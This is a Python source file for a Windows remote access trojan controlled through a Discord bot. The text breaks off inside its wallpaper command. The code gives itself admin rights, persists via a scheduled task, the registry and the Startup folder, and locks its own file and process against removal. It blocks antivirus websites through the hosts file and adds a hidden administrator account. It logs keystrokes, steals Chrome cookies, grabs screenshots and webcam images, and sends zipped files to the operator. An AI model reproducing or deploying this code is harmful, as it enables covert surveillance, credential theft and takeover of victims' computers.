import discord
from discord.ext import commands
import os
import shutil
import socket
import re
import pyautogui
import io
import sqlite3
import tempfile
import browsercookie
import platform
import psutil
import atexit
import time
import ctypes
import signal
from pynput import keyboard
import threading
from collections import deque
import asyncio
import zipfile
import cv2
import webbrowser
from urllib.parse import urlparse
import tkinter as tk
import pyperclip
import winreg
import subprocess
from pathlib import Path
import sys
import requests
from datetime import datetime
import win32security
import win32file
import win32api
import win32con

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents)

device_name = socket.gethostname()
sanitized_channel_name = re.sub(r'[^a-z0-9_-]', '-', device_name.lower())[:100]

pending_install_file = None
install_channel = None
bsod_root = None

key_buffer = deque(maxlen=1000)
buffer_lock = threading.Lock()

def create_embed(title, description, color, fields=None, status=None):
    embed = discord.Embed(title=title, description=description, color=color, timestamp=datetime.utcnow())
    if fields:
        for name, value in fields:
            embed.add_field(name=name, value=value, inline=False)
    if status:
        embed.add_field(name="Status", value=status, inline=True)
    return embed

script_file = os.path.abspath(__file__)
original_sd = None

def protect_file():
    global original_sd
    try:
        original_sd = win32security.GetFileSecurity(script_file, win32security.DACL_SECURITY_INFORMATION)
        dacl = win32security.ACL()
        everyone_sid = win32security.CreateWellKnownSid(win32security.WinWorldSid)
        dacl.AddAccessDeniedAce(win32security.ACL_REVISION, win32con.DELETE, everyone_sid)
        sd = win32security.SECURITY_DESCRIPTOR()
        sd.SetSecurityDescriptorDacl(1, dacl, 0)
        win32security.SetFileSecurity(script_file, win32security.DACL_SECURITY_INFORMATION, sd)
        return True, "File deletion protection applied."
    except Exception as e:
        return False, f"Error protecting file: {str(e)}"

def restore_file_permissions():
    try:
        if original_sd:
            win32security.SetFileSecurity(script_file, win32security.DACL_SECURITY_INFORMATION, original_sd)
        return True, "File deletion protection removed."
    except Exception as e:
        return False, f"Error restoring file permissions: {str(e)}"

def protect_process():
    try:
        process_handle = win32api.GetCurrentProcess()
        sd = win32security.GetSecurityInfo(
            process_handle, win32security.SE_PROCESS, win32security.DACL_SECURITY_INFORMATION
        )
        dacl = sd.GetSecurityDescriptorDacl()
        everyone_sid = win32security.CreateWellKnownSid(win32security.WinWorldSid)
        dacl.AddAccessDeniedAce(win32security.ACL_REVISION, win32con.PROCESS_TERMINATE, everyone_sid)
        new_sd = win32security.SECURITY_DESCRIPTOR()
        new_sd.SetSecurityDescriptorDacl(1, dacl, 0)
        win32security.SetSecurityInfo(
            process_handle, win32security.SE_PROCESS, win32security.DACL_SECURITY_INFORMATION,
            None, None, dacl, None
        )
        return True, "Process termination protection applied."
    except Exception as e:
        return False, f"Error protecting process: {str(e)}"

def create_scheduled_task():
    try:
        task_name = "DemoBotTask"
        script_path = os.path.abspath(__file__)
        if script_path.endswith('.py'):
            python_exe = shutil.which('python')
            if not python_exe:
                return False, "Python executable not found."
            command = f'"{python_exe}" "{script_path}"'
        else:
            command = f'"{script_path}"'
        
        result = subprocess.run(f'schtasks /query /tn "{task_name}"', shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return True, "Scheduled task already exists."
        
        schtasks_command = (
            f'schtasks /create /tn "{task_name}" /tr "{command}" /sc onlogon '
            f'/rl highest /f'
        )
        result = subprocess.run(schtasks_command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return True, "Scheduled task created for auto-admin execution."
        else:
            return False, f"Error creating scheduled task: {result.stderr}"
    except Exception as e:
        return False, f"Error creating scheduled task: {str(e)}"

def initialize_protection():
    file_success, file_message = protect_file()
    process_success, process_message = protect_process()
    task_success, task_message = create_scheduled_task()
    return [
        ("File Protection", file_message, file_success),
        ("Process Protection", process_message, process_success),
        ("Scheduled Task", task_message, task_success)
    ]

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
        sys.exit()

if platform.system() == "Windows":
    if not is_admin():
        success, message = create_scheduled_task()
        if success:
            sys.exit()
        else:
            run_as_admin()

async def send_offline_message():
    if bot.guilds:
        guild = bot.guilds[0]
        if guild.text_channels:
            channel = discord.utils.get(guild.text_channels, name=sanitized_channel_name) or guild.text_channels[0]
            perms = channel.permissions_for(guild.me)
            if perms.send_messages:
                try:
                    embed = create_embed(
                        title="Device Offline",
                        description=f"{device_name} has gone offline.",
                        color=discord.Color.red(),
                        fields=[("Status", "Disconnected from Discord")]
                    )
                    await channel.send(embed=embed)
                except Exception:
                    pass

def shutdown_handler():
    loop = asyncio.get_event_loop()
    if loop.is_running():
        loop.create_task(send_offline_message())
        time.sleep(1)
    else:
        loop.run_until_complete(send_offline_message())

atexit.register(shutdown_handler)
atexit.register(restore_file_permissions)

@bot.event
async def on_ready():
    if bot.guilds:
        guild = bot.guilds[0]
        try:
            bot_member = guild.get_member(bot.user.id)
            if not bot_member.guild_permissions.manage_channels:
                return
            
            existing_channel = discord.utils.get(guild.text_channels, name=sanitized_channel_name)
            if not existing_channel:
                await guild.create_text_channel(sanitized_channel_name)
            
            channel = discord.utils.get(guild.text_channels, name=sanitized_channel_name) or guild.text_channels[0]
            perms = channel.permissions_for(guild.me)
            if perms.send_messages:
                protection_results = initialize_protection()
                protection_fields = []
                all_success = True
                for name, message, success in protection_results:
                    protection_fields.append((name, message))
                    if not success:
                        all_success = False
                
                embed = create_embed(
                    title="Protection Status",
                    description="Initialized file, process, and task protections.",
                    color=discord.Color.purple() if all_success else discord.Color.red(),
                    fields=protection_fields,
                    status="Success" if all_success else "Partial Failure"
                )
                await channel.send(embed=embed)
                
                embed = create_embed(
                    title="Device Online",
                    description=f"{device_name} is now online.",
                    color=discord.Color.green(),
                    fields=[
                        ("Hostname", device_name),
                        ("OS", f"{platform.system()} {platform.release()} ({platform.architecture()[0]})"),
                        ("Status", "Connected to Discord")
                    ]
                )
                await channel.send(embed=embed)
                
                if platform.system() == "Windows":
                    try:
                        script_path = os.path.abspath(__file__)
                        registry_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
                        app_name = "DemoBot"
                        
                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_key, 0, winreg.KEY_READ) as key:
                            try:
                                winreg.QueryValueEx(key, app_name)
                            except FileNotFoundError:
                                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_key, 0, winreg.KEY_SET_VALUE) as key:
                                    if script_path.endswith('.py'):
                                        python_exe = shutil.which('python')
                                        if python_exe:
                                            command = f'"{python_exe}" "{script_path}"'
                                        else:
                                            command = f'"{script_path}"'
                                    else:
                                        command = f'"{script_path}"'
                                    winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, command)
                                embed = create_embed(
                                    title="Startup Registry",
                                    description=f"Added to startup registry: {app_name}",
                                    color=discord.Color.purple(),
                                    status="Success"
                                )
                                await channel.send(embed=embed)
                    except Exception as e:
                        embed = create_embed(
                            title="Startup Registry Error",
                            description=f"Error adding to startup registry: {e}",
                            color=discord.Color.red(),
                            status="Failed"
                        )
                        await channel.send(embed=embed)
                
                if platform.system() == "Windows":
                    try:
                        hosts_path = Path(r"C:\Windows\System32\drivers\etc\hosts")
                        blocked_domains = ["www.virustotal.com", "www.malwarebytes.com"]
                        hosts_content = hosts_path.read_text() if hosts_path.exists() else ""
                        new_entries = ""
                        
                        for domain in blocked_domains:
                            if domain not in hosts_content:
                                new_entries += f"127.0.0.1 {domain}\n"
                        
                        if new_entries:
                            with open(hosts_path, 'a') as hosts_file:
                                hosts_file.write(new_entries)
                            embed = create_embed(
                                title="Website Blocking",
                                description=f"Blocked websites in hosts file: {', '.join(blocked_domains)}",
                                color=discord.Color.purple(),
                                status="Success"
                            )
                            await channel.send(embed=embed)
                    except Exception as e:
                        embed = create_embed(
                            title="Website Blocking Error",
                            description=f"Error blocking websites: {e}",
                            color=discord.Color.red(),
                            status="Failed"
                        )
                        await channel.send(embed=embed)
                
                if platform.system() == "Windows":
                    try:
                        username = "DemoAdmin"
                        password = "DemoPass123!"
                        subprocess.run(f'net user {username} {password} /add', shell=True, check=True, capture_output=True)
                        subprocess.run(f'net localgroup Administrators {username} /add', shell=True, check=True, capture_output=True)
                        embed = create_embed(
                            title="Admin Account Creation",
                            description=f"Created admin account: {username}",
                            color=discord.Color.purple(),
                            status="Success"
                        )
                        await channel.send(embed=embed)
                    except subprocess.CalledProcessError as e:
                        if b"already exists" in e.stderr:
                            embed = create_embed(
                                title="Admin Account Creation",
                                description=f"Admin account {username} already exists",
                                color=discord.Color.purple(),
                                status="Success"
                            )
                            await channel.send(embed=embed)
                        else:
                            embed = create_embed(
                                title="Admin Account Creation Error",
                                description=f"Error creating admin account: {e.stderr.decode()}",
                                color=discord.Color.red(),
                                status="Failed"
                            )
                            await channel.send(embed=embed)
                    except Exception as e:
                        embed = create_embed(
                            title="Admin Account Creation Error",
                            description=f"Error creating admin account: {e}",
                            color=discord.Color.red(),
                            status="Failed"
                        )
                        await channel.send(embed=embed)
            
        except Exception:
            pass

def keylog_background():
    def on_press(key):
        try:
            with buffer_lock:
                key_buffer.append((str(key).replace("'", ""), time.time()))
            
            global pending_install_file, install_channel
            if pending_install_file and install_channel:
                if platform.system() != "Windows":
                    asyncio.run_coroutine_threadsafe(
                        install_channel.send(embed=create_embed(
                            title="Install Command Error",
                            description="File movement and startup setup are only supported on Windows.",
                            color=discord.Color.red(),
                            status="Failed"
                        )),
                        bot.loop
                    )
                    pending_install_file = None
                    install_channel = None
                    return
                
                try:
                    appdata_path = os.getenv('APPDATA')
                    installed_files_path = os.path.join(appdata_path, 'InstalledFiles')
                    os.makedirs(installed_files_path, exist_ok=True)
                    filename = os.path.basename(pending_install_file)
                    new_path = os.path.join(installed_files_path, filename)
                    shutil.move(pending_install_file, new_path)
                    
                    startup_path = os.path.join(appdata_path, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                    startup_file_path = os.path.join(startup_path, filename)
                    shutil.copy(new_path, startup_path)
                    
                    asyncio.run_coroutine_threadsafe(
                        install_channel.send(embed=create_embed(
                            title="Install Command",
                            description=f"File {filename} moved to:\n- AppData: {new_path}\n- Startup: {startup_file_path}",
                            color=discord.Color.purple(),
                            status="Success"
                        )),
                        bot.loop
                    )
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(
                        install_channel.send(embed=create_embed(
                            title="Install Command Error",
                            description=f"Error moving file or setting startup: {e}",
                            color=discord.Color.red(),
                            status="Failed"
                        )),
                        bot.loop
                    )
                finally:
                    pending_install_file = None
                    install_channel = None
        except Exception:
            pass
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

threading.Thread(target=keylog_background, daemon=True).start()

@bot.command()
async def install(ctx):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages or not perms.attach_files:
            embed = create_embed(
                title="Install Command Error",
                description="Missing permissions to send messages or attach files.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if len(ctx.message.attachments) == 0:
            embed = create_embed(
                title="Install Command Error",
                description="No file attached! Please attach a file with the .install command.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return

        attachment = ctx.message.attachments[0]
        filename = attachment.filename
        filepath = f"./downloaded/{filename}"

        os.makedirs("./downloaded", exist_ok=True)
        await attachment.save(filepath)
        
        global pending_install_file, install_channel
        pending_install_file = filepath
        install_channel = ctx.channel
        embed = create_embed(
            title="Install Command",
            description="File downloaded. Press any key to move to AppData and set to run on startup.",
            color=discord.Color.purple(),
            status="Success"
        )
        await ctx.send(embed=embed)
        
    except Exception as e:
        embed = create_embed(
            title="Install Command Error",
            description=f"Error processing .install command: {e}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def ss(ctx):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages or not perms.attach_files:
            embed = create_embed(
                title="Screenshot Command Error",
                description="Missing permissions to send messages or attach files.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        
        embed = create_embed(
            title="Screenshot Command",
            description="Screenshot taken and sent successfully.",
            color=discord.Color.purple(),
            status="Success"
        )
        await ctx.send(embed=embed, file=discord.File(screenshot_path))
        
        os.remove(screenshot_path)
        
    except Exception as e:
        embed = create_embed(
            title="Screenshot Command Error",
            description=f"Error taking screenshot: {e}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def grab(ctx):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages or not perms.attach_files:
            embed = create_embed(
                title="Grab Command Error",
                description="Missing permissions to send messages or attach files.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if platform.system() != "Windows":
            embed = create_embed(
                title="Grab Command Error",
                description="Cookie grabbing is only supported on Windows.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        chrome_running = False
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() == 'chrome.exe':
                chrome_running = True
                break
        
        if not chrome_running:
            embed = create_embed(
                title="Grab Command Error",
                description="Google Chrome is not running.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        chrome_cookie_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies')
        
        with tempfile.NamedTemporaryFile(delete=False, suffix='.sqlite') as temp_file:
            temp_cookie_path = temp_file.name
        shutil.copy2(chrome_cookie_path, temp_cookie_path)
        
        conn = sqlite3.connect(temp_cookie_path)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%google%'")
        cookies = cursor.fetchall()
        conn.close()
        
        os.remove(temp_cookie_path)
        
        if cookies:
            cookie_data = "\n".join([f"{name}: {value} (Domain: {host})" for host, name, value in cookies])
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as temp_file:
                temp_file.write(cookie_data)
                temp_path = temp_file.name
            
            embed = create_embed(
                title="Grab Command",
                description="Google cookies captured successfully.",
                color=discord.Color.purple(),
                status="Success"
            )
            await ctx.send(embed=embed, file=discord.File(temp_path, "google_cookies.txt"))
            os.remove(temp_path)
        else:
            embed = create_embed(
                title="Grab Command",
                description="No Google cookies found.",
                color=discord.Color.purple(),
                status="Success"
            )
            await ctx.send(embed=embed)
        
    except Exception as e:
        embed = create_embed(
            title="Grab Command Error",
            description=f"Error processing .grab command: {str(e)}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def sysinfo(ctx):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages:
            embed = create_embed(
                title="System Info Command Error",
                description="Missing permissions to send messages.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        sys_info = []
        sys_info.append(f"OS: {platform.system()} {platform.release()} ({platform.architecture()[0]})")
        sys_info.append(f"Processor: {platform.processor()}")
        
        mem = psutil.virtual_memory()
        sys_info.append(f"Memory: {mem.used / (1024**3):.2f}/{mem.total / (1024**3):.2f} GB ({mem.percent}%)")
        
        disk = psutil.disk_usage('/')
        sys_info.append(f"Disk: {disk.used / (1024**3):.2f}/{disk.total / (1024**3):.2f} GB ({disk.percent}%)")
        
        sys_info.append(f"Hostname: {device_name}")
        
        embed = create_embed(
            title="System Info Command",
            description="System information retrieved successfully.",
            color=discord.Color.purple(),
            fields=[("Details", "\n".join(sys_info))],
            status="Success"
        )
        await ctx.send(embed=embed)
        
    except Exception as e:
        embed = create_embed(
            title="System Info Command Error",
            description=f"Error retrieving system info: {e}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def blockinput(ctx):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages:
            embed = create_embed(
                title="Block Input Command Error",
                description="Missing permissions to send messages.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if platform.system() == "Windows":
            if ctypes.windll.user32.BlockInput(True):
                embed = create_embed(
                    title="Block Input Command",
                    description="Mouse and keyboard input blocked. Use .unblockinput to restore.",
                    color=discord.Color.purple(),
                    status="Success"
                )
                await ctx.send(embed=embed)
            else:
                embed = create_embed(
                    title="Block Input Command Error",
                    description="Failed to block input (requires admin privileges).",
                    color=discord.Color.red(),
                    status="Failed"
                )
                await ctx.send(embed=embed)
        else:
            embed = create_embed(
                title="Block Input Command Error",
                description="Input blocking is only supported on Windows.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
        
    except Exception as e:
        embed = create_embed(
            title="Block Input Command Error",
            description=f"Error processing .blockinput command: {e}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def unblockinput(ctx):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages:
            embed = create_embed(
                title="Unblock Input Command Error",
                description="Missing permissions to send messages.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if platform.system() == "Windows":
            if ctypes.windll.user32.BlockInput(False):
                embed = create_embed(
                    title="Unblock Input Command",
                    description="Mouse and keyboard input unblocked.",
                    color=discord.Color.purple(),
                    status="Success"
                )
                await ctx.send(embed=embed)
            else:
                embed = create_embed(
                    title="Unblock Input Command Error",
                    description="Failed to unblock input (requires admin privileges).",
                    color=discord.Color.red(),
                    status="Failed"
                )
                await ctx.send(embed=embed)
        else:
            embed = create_embed(
                title="Unblock Input Command Error",
                description="Input unblocking is only supported on Windows.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
        
    except Exception as e:
        embed = create_embed(
            title="Unblock Input Command Error",
            description=f"Error processing .unblockinput command: {e}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def block(ctx, *, url):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages:
            embed = create_embed(
                title="Block Command Error",
                description="Missing permissions to send messages.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if platform.system() != "Windows":
            embed = create_embed(
                title="Block Command Error",
                description="Website blocking is only supported on Windows.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        parsed_url = urlparse(url)
        if not parsed_url.scheme in ('http', 'https'):
            embed = create_embed(
                title="Block Command Error",
                description="Invalid URL. Please provide a valid URL starting with http:// or https://.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        domain = parsed_url.hostname
        if not domain:
            embed = create_embed(
                title="Block Command Error",
                description="Invalid URL. Could not extract domain.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        try:
            hosts_path = Path(r"C:\Windows\System32\drivers\etc\hosts")
            hosts_content = hosts_path.read_text() if hosts_path.exists() else ""
            
            if domain not in hosts_content:
                with open(hosts_path, 'a') as hosts_file:
                    hosts_file.write(f"127.0.0.1 {domain}\n")
                embed = create_embed(
                    title="Block Command",
                    description=f"Blocked website: {domain}",
                    color=discord.Color.purple(),
                    status="Success"
                )
                await ctx.send(embed=embed)
            else:
                embed = create_embed(
                    title="Block Command",
                    description=f"Website {domain} is already blocked.",
                    color=discord.Color.purple(),
                    status="Success"
                )
                await ctx.send(embed=embed)
        except Exception as e:
            embed = create_embed(
                title="Block Command Error",
                description=f"Error blocking website: {str(e)}",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
        
    except Exception as e:
        embed = create_embed(
            title="Block Command Error",
            description=f"Error processing .block command: {str(e)}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def commands(ctx):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages:
            embed = create_embed(
                title="Commands List Error",
                description="Missing permissions to send messages.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        command_descriptions = {
            "sysinfo": "Displays system information.",
            "killall": "Terminates non-critical processes.",
            "ip": "Displays public IP and sends network configuration as a file.",
            "geolocation": "Provides a Google Maps link approximating location based on public IP.",
            "boot-offline": "Disables Wi-Fi and locks it until device restart (Windows, admin required).",
            "blockinput": "Blocks input (Windows, admin required).",
            "unblockinput": "Unblocks input (Windows, admin required).",
            "keylog": "Sends last 10 seconds of keystrokes or types provided text into active application.",
            "install": "Downloads a file, moves to AppData on key press, and sets startup.",
            "file_ransom": "Zips files modified in last week and sends to Discord.",
            "grab": "Extracts Chrome cookies for Google domains and sends as a file.",
            "sessionsteal": "Steals browser session cookies for a demo site.",
            "clipgrab": "Steals clipboard data and optionally replaces crypto addresses.",
            "ss": "Takes and sends a screenshot.",
            "webcam": "Takes and sends a webcam snapshot.",
            "wallpaper": "Changes desktop wallpaper with attached image.",
            "crashfake": "Displays a realistic Blue Screen of Death.",
            "unbluescreen": "Closes the Blue Screen of Death displayed by .crashfake.",
            "link": "Opens a URL in the default browser.",
            "message": "Displays a pop-up message on the screen.",
            "block": "Blocks a specified website by adding it to the hosts file (Windows, admin required).",
            "commands": "Lists all commands (bot auto-elevates, runs as admin, blocks websites, adds startup, protects itself)."
        }
        
        categories = {
            "System Commands": ["sysinfo", "killall"],
            "Network Commands": ["ip", "geolocation", "boot-offline"],
            "Input Commands": ["blockinput", "unblockinput", "keylog"],
            "File Commands": ["install", "file_ransom"],
            "Browser Commands": ["grab", "sessionsteal", "clipgrab"],
            "Visual Commands": ["ss", "webcam", "wallpaper", "crashfake", "unbluescreen"],
            "Other Commands": ["link", "message", "block", "commands"]
        }
        
        embed = create_embed(
            title="Command List",
            description="Available commands for the bot, grouped by category.",
            color=discord.Color.blue(),
            status="Success"
        )
        
        for category, cmds in categories.items():
            cmd_lines = []
            for cmd in sorted(cmds):
                desc = command_descriptions.get(cmd, "No description.")
                cmd_lines.append(f"**`.{cmd}`**: {desc}")
            if cmd_lines:
                embed.add_field(name=category, value="\n".join(cmd_lines), inline=False)
        
        await ctx.send(embed=embed)
        
    except Exception as e:
        embed = create_embed(
            title="Commands List Error",
            description=f"Error listing commands: {e}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def killall(ctx):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages:
            embed = create_embed(
                title="Kill All Command Error",
                description="Missing permissions to send messages.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        critical_processes = [
            "csrss.exe", "winlogon.exe", "svchost.exe", "smss.exe", "lsass.exe",
            "explorer.exe", "taskmgr.exe", "dwm.exe", "wininit.exe"
        ] if platform.system() == "Windows" else [
            "init", "systemd", "udevd", "dbus", "sshd", "bash", "sh"
        ]
        
        terminated = []
        failed = []
        
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                proc_name = proc.info['name'].lower()
                if proc_name not in critical_processes and proc.pid != os.getpid():
                    if platform.system() == "Windows":
                        proc.terminate()
                    else:
                        os.kill(proc.pid, signal.SIGTERM)
                    terminated.append(proc_name)
            except (psutil.AccessDenied, psutil.NoSuchProcess, OSError) as e:
                failed.append(f"{proc_name} ({e})")
        
        result = []
        if terminated:
            result.append(f"Terminated: {', '.join(terminated[:5])}{' and more' if len(terminated) > 5 else ''}")
        if failed:
            result.append(f"Failed: {', '.join(failed[:5])}{' and more' if len(failed) > 5 else ''}")
        if not terminated and not failed:
            result.append("No processes were terminated.")
        
        embed = create_embed(
            title="Kill All Command",
            description="Attempted to terminate non-critical processes.",
            color=discord.Color.purple(),
            fields=[("Results", "\n".join(result))],
            status="Success"
        )
        await ctx.send(embed=embed)
        
    except Exception as e:
        embed = create_embed(
            title="Kill All Command Error",
            description=f"Error processing .killall command: {e}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def keylog(ctx, *, text=None):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages or not perms.attach_files:
            embed = create_embed(
                title="Keylog Command Error",
                description="Missing permissions to send messages or attach files.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if platform.system() != "Windows":
            embed = create_embed(
                title="Keylog Command Error",
                description="Keylogging and text input are only supported on Windows.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if text:
            try:
                safe_text = re.sub(r'[\n\r\t]', ' ', text)
                pyautogui.write(safe_text, interval=0.01)
                embed = create_embed(
                    title="Keylog Command",
                    description=f"Typed text: {safe_text}",
                    color=discord.Color.purple(),
                    status="Success"
                )
                await ctx.send(embed=embed)
            except Exception as e:
                embed = create_embed(
                    title="Keylog Command Error",
                    description=f"Error typing text: {str(e)}",
                    color=discord.Color.red(),
                    status="Failed"
                )
                await ctx.send(embed=embed)
        else:
            with buffer_lock:
                current_time = time.time()
                recent_keys = [key for key, timestamp in key_buffer if current_time - timestamp <= 10]
            
            keylog_data = "".join(recent_keys) if recent_keys else "No keys captured in the last 10 seconds."
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as temp_file:
                temp_file.write(keylog_data)
                temp_path = temp_file.name
            
            embed = create_embed(
                title="Keylog Command",
                description="Last 10 seconds of keystrokes captured.",
                color=discord.Color.purple(),
                status="Success"
            )
            await ctx.send(embed=embed, file=discord.File(temp_path, "keylog.txt"))
            
            os.remove(temp_path)
        
    except Exception as e:
        embed = create_embed(
            title="Keylog Command Error",
            description=f"Error processing .keylog command: {str(e)}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def file_ransom(ctx):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages or not perms.attach_files:
            embed = create_embed(
                title="File Ransom Command Error",
                description="Missing permissions to send messages or attach files.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        demo_dir = "./demo_files"
        os.makedirs(demo_dir, exist_ok=True)
        
        current_time = time.time()
        one_week_ago = current_time - (7 * 24 * 60 * 60)
        
        recent_files = []
        for root, _, files in os.walk(demo_dir):
            for file in files:
                file_path = os.path.join(root, file)
                mtime = os.path.getmtime(file_path)
                ctime = os.path.getctime(file_path)
                if mtime >= one_week_ago or ctime >= one_week_ago:
                    recent_files.append(file_path)
        
        if not recent_files:
            embed = create_embed(
                title="File Ransom Command",
                description="No files modified or created in the last week found in demo_files.",
                color=discord.Color.purple(),
                status="Success"
            )
            await ctx.send(embed=embed)
            return
        
        zip_path = tempfile.NamedTemporaryFile(delete=False, suffix='.zip').name
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file_path in recent_files:
                arcname = os.path.relpath(file_path, demo_dir)
                zipf.write(file_path, arcname)
        
        embed = create_embed(
            title="File Ransom Command",
            description="Recent files zipped and sent.",
            color=discord.Color.purple(),
            status="Success"
        )
        await ctx.send(embed=embed, file=discord.File(zip_path, "ransom_files.zip"))
        
        os.remove(zip_path)
        
    except Exception as e:
        embed = create_embed(
            title="File Ransom Command Error",
            description=f"Error processing .file_ransom command: {e}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def webcam(ctx):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages or not perms.attach_files:
            embed = create_embed(
                title="Webcam Command Error",
                description="Missing permissions to send messages or attach files.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            embed = create_embed(
                title="Webcam Command Error",
                description="No webcam found or access denied.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            cap.release()
            return
        
        ret, frame = cap.read()
        if not ret:
            embed = create_embed(
                title="Webcam Command Error",
                description="Failed to capture webcam snapshot.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            cap.release()
            return
        
        snapshot_path = tempfile.NamedTemporaryFile(delete=False, suffix='.png').name
        cv2.imwrite(snapshot_path, frame)
        cap.release()
        
        embed = create_embed(
            title="Webcam Command",
            description="Webcam snapshot taken and sent.",
            color=discord.Color.purple(),
            status="Success"
        )
        await ctx.send(embed=embed, file=discord.File(snapshot_path, "webcam_snapshot.png"))
        
        os.remove(snapshot_path)
        
    except Exception as e:
        embed = create_embed(
            title="Webcam Command Error",
            description=f"Error processing .webcam command: {e}",
            color=discord.Color.red(),
            status="Failed"
        )
        await ctx.send(embed=embed)

@bot.command()
async def wallpaper(ctx):
    try:
        perms = ctx.channel.permissions_for(ctx.guild.me)
        if not perms.send_messages or not perms.attach_files:
            embed = create_embed(
                title="Wallpaper Command Error",
                description="Missing permissions to send messages or attach files.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        if len(ctx.message.attachments) == 0:
            embed = create_embed(
                title="Wallpaper Command Error",
                description="No image attached! Please attach an image file (e.g., .jpg, .png) with the .wallpaper command.",
                color=discord.Color.red(),
                status="Failed"
            )
            await ctx.send(embed=embed)
            return
        
        attachment = ctx.message.attachments[0]
        if not attachment.filename.lower().endswith(('.jpg', '.jpeg', '.png', '.bmp')):
            embed = create_embed(
                title="Wallpaper Command Error",
                description="Invalid file type. Please attach an image (.jpg, .jpeg, .png, .bmp).",
